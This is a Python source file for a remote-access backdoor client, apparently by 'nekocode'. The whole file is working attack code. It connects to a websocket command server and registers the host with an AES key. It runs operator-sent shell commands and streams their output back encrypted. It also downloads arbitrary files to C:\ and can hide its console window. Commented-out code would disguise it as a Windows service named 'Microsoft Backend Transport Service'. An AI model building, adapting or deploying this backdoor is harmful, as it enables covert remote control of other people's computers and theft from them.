#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import sys
import chardet
import ctypes
from subprocess import Popen, PIPE
import threading
import uuid
import json
import time
import urllib
from base64 import b64decode, b64encode
from websocket import create_connection
from Crypto.Cipher import AES

# import win32service
# import win32serviceutil
# import win32event
__author__ = 'nekocode'


def get_char(msg):
    return b64decode(msg['char'])


class BackdoorClient(threading.Thread):
    cmd_queue = []
    consoles = []

    def __init__(self):
        threading.Thread.__init__(self)
        self.SERVER_HOST = 'ws://localhost:8888'
        self.HOST_NAME = hostname()
        self.UUID = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
        self.IV = '\0' * AES.block_size
        self.SECRET = os.urandom(32)
        self.ws = None

        self.daemon = True
        self.start()

    def run(self):
        while True:
            try:
                self.ws = create_connection(self.SERVER_HOST)

                sercret_msg = {'uuid': self.UUID, 'host_name': self.HOST_NAME, 'secret': b64encode(self.SECRET)}
                self.ws.send_binary(json.dumps(sercret_msg))

                time.sleep(1)

                while True:
                    msg = json.loads(self.decrypt(self.ws.recv()))
                    if 'new_consloe' in msg:
                        to_controler = msg['new_consloe']
                        
                        if len(BackdoorClient.consoles) != 0:
                            for _con in BackdoorClient.consoles:
                                _con.exit = True
                                BackdoorClient.consoles.remove(_con)

                        consloe = Cmd(self, to_controler)
                        BackdoorClient.consoles.append(consloe)

                        self.send_json({'connected': None, 'to': to_controler})

                    elif 'cmd' in msg:
                        command = b64decode(msg['cmd'])
                        BackdoorClient.cmd_queue.append(command)
                        # todo

                    elif 'char' in msg:
                        char = get_char(msg)

                        if len(BackdoorClient.consoles) > 0:
                            con = BackdoorClient.consoles[0]
                            con.write_pipe.write(char)
                            con.write_pipe.flush()

                self.ws.close()

            except Exception as e:
                print e.message
                if self.ws is not None:
                    self.ws.close()
                time.sleep(3)

    def send_data(self, data, to=None):
        self.ws.send_binary(self.encrypt(json.dumps({'data': b64encode(data), 'to': to})))

    def send_char(self, char, to=None):
        self.ws.send_binary(self.encrypt(json.dumps({'char': b64encode(char), 'to': to})))

    def send_json(self, jsonobj):
        self.ws.send_binary(self.encrypt(json.dumps(jsonobj)))

    def send_end(self, to=None):
        self.ws.send_binary(self.encrypt(json.dumps({'end': 'true', 'to': to})))

    def encrypt(self, text):
        encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        ciphertext = encryptor.encrypt(text)
        return ciphertext

    def decrypt(self, ciphertext):
        decryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        plain = decryptor.decrypt(ciphertext)
        return plain


class BufSender(threading.Thread):
    BUF_SIZE = 10

    def __init__(self, client, to_controler):
        threading.Thread.__init__(self)

        self.buf = ''
        self.send_char = client.send_char
        self.to_controler = to_controler
        self.flush = False
        self.time_count = 0

        self.exit = False
        self.exited = False
        self.daemon = True
        self.start()

    def run(self):
        while not self.exit:
            if len(self.buf) > BufSender.BUF_SIZE or self.flush:
                self.send_char(self.buf, self.to_controler)
                self.buf = ''
                self.flush = False
            else:
                time.sleep(0.01)
                self.time_count += 1
                if self.time_count >= 20:
                    if len(self.buf) != 0:
                        self.flush = True

                    self.time_count = 0

        self.exited = True


class Cmd(threading.Thread):
    def __init__(self, client, to_controler):
        threading.Thread.__init__(self)

        r, w = os.pipe()
        self.read_pipe = os.fdopen(r, 'r')
        self.write_pipe = os.fdopen(w, 'w')

        self.send_data = client.send_data
        self.send_char = client.send_char
        self.send_end = client.send_end
        self.to_controler = to_controler
        self.buf_sender = BufSender(client, to_controler)

        self.exit = False
        self.daemon = True
        self.start()

    def run(self):
        try:
            while not self.exit:
                while len(BackdoorClient.cmd_queue) == 0:
                    time.sleep(0.1)

                cmd_input = BackdoorClient.cmd_queue.pop(0)

                if cmd_input == 'cmd':
                    self.send_data('You are allready in cmd.', self.to_controler)
                    self.send_end(self.to_controler)
                    continue

                proc = Popen(cmd_input, shell=True, stdout=PIPE, stderr=PIPE, stdin=self.read_pipe)

                char = proc.stdout.read(1)
                self.buf_sender.buf += char
                while char:
                    char = proc.stdout.read(1)
                    self.buf_sender.buf += char

                char = proc.stderr.read(1)
                self.buf_sender.buf += char
                while char:
                    char = proc.stderr.read(1)
                    self.buf_sender.buf += char

                proc.wait()

                self.buf_sender.flush = True
                while self.buf_sender.flush:
                    time.sleep(0.1)

                self.send_end(self.to_controler)

            self.buf_sender.exit = True

        except Exception as e:
            self.send_data('ERROR: ' + e.message, self.to_controler)
            self.send_end(self.to_controler)


class Download(threading.Thread):
    def __init__(self, url, filename):
        threading.Thread.__init__(self)

        self.url = url
        self.filename = filename

        self.daemon = True
        self.start()

    def run(self):
        try:
            data = urllib.urlopen(self.url).read()
            with open("c:\\" + self.filename, 'wb') as f:
                f.write(data)

        except Exception as e:
            pass


# class BackendDaemonSrv(win32serviceutil.ServiceFramework):
#     _svc_name_ = 'TransSrv'
#     _svc_display_name_ = 'Microsoft Backend Transport Service'
#     _svc_description_ = 'Enables you to access your pc anytime, anywhere.'
#
#     def __init__(self, args):
#         win32serviceutil.ServiceFramework.__init__(self, args)
#         self.stop_event = win32event.CreateEvent(None, 0, 0, None)
#
#     def SvcDoRun(self):
#         self.ReportServiceStatus(win32service.SERVICE_START_PENDING)
#         try:
#             self.ReportServiceStatus(win32service.SERVICE_RUNNING)
#             self.start()
#             win32event.WaitForSingleObject(self.stop_event, win32event.INFINITE)
#         except Exception, x:
#             self.SvcStop()
#
#     def SvcStop(self):
#         self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
#         win32event.SetEvent(self.stop_event)
#         self.ReportServiceStatus(win32service.SERVICE_STOPPED)
#
#     def start(self):
#         self.runflag = True
#         os.popen('cmd.exe')
#
#     def my_stop(self):
#         self.runflag = False


def module_path():
    encoding = sys.getfilesystemencoding()
    if hasattr(sys, 'frozen'):
        return os.path.dirname(unicode(sys.executable, encoding))
    return os.path.dirname(unicode(__file__, encoding))


def decode2utf(rawstr):
    if chardet.detect(rawstr)['encoding'] != 'ascii':
        return rawstr.decode('gbk')
    else:
        return rawstr.decode('ascii')


def hostname():
    sys_name = os.name

    if sys_name == 'nt':
        return os.getenv('computername')
    elif sys_name == 'posix':
        host = os.popen('echo $HOSTNAME')
        try:
            name = host.read()
            return name
        finally:
            host.close()
    else:
        return 'Unknow hostname'


def hide_cmd_window():
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)
        ctypes.windll.kernel32.CloseHandle(whnd)


if __name__ == '__main__':
    # if len(sys.argv) == 1:
    # hide_cmd_window()
    BackdoorClient()
    while True:
        time.sleep(10)
    # else:
    #     win32serviceutil.HandleCommandLine(BackendDaemonSrv)

